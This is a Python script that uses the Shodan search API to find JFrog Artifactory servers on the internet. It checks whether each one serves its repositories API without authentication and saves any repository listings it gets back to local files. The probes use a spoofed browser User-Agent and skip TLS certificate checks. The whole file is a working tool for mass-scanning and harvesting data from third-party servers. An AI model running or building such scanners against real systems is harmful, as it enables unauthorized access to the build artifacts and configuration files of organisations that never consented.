#!/usr/bin/env python3
#
# artifactory.py
# Search SHODAN for JFrog Artifactory instances allowing anonymous access to
# the repositories API. Anonymous access (the default on many installs) lists
# every repository and serves the artifacts inside — internal builds, config
# files, and anything else that was committed to them.
#
# Author: random_robbie

import os
import sys

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from common import get_api_key, open_output

import shodan
import requests

# Configuration
SEARCH_FOR = 'http.title:"Artifactory"'
REPOS_PATH = "/artifactory/api/repositories"
CFG_DIR = "cfg"
session = requests.Session()


def grab_repos(ip, port):
    """Check whether the repositories API answers without authentication."""
    print("[*] Testing: " + ip + " on Port: " + port + "[*]\n")
    try:
        url = "http://" + ip + ":" + port + REPOS_PATH
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/156.0.0.0 Safari/537.36",
            "Connection": "close",
            "Accept": "application/json",
        }
        response = session.get(url, headers=headers, timeout=15, verify=False)
        if response.status_code == 200 and "[" in response.text:
            with open_output(os.path.join(CFG_DIR, ip + "-artifactory.json"), "a") as fh:
                fh.write(response.text + "\n")
            print("[*] Artifactory anonymous access Whooops.. [*]\n")
        else:
            print("[*] Artifactory requires authentication. [*]\n")
    except KeyboardInterrupt:
        sys.exit("Ctrl-c pressed ...")
    except Exception as e:
        print(e)
        print("[*] Nothing Found on IP:" + ip + " [*]\n")


def main():
    api = shodan.Shodan(get_api_key())
    result = api.search(SEARCH_FOR)
    for service in result["matches"]:
        grab_repos(service["ip_str"], str(service["port"]))


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        sys.exit("Ctrl-c pressed ...")
    except Exception as e:
        sys.exit("Error: %s" % e)
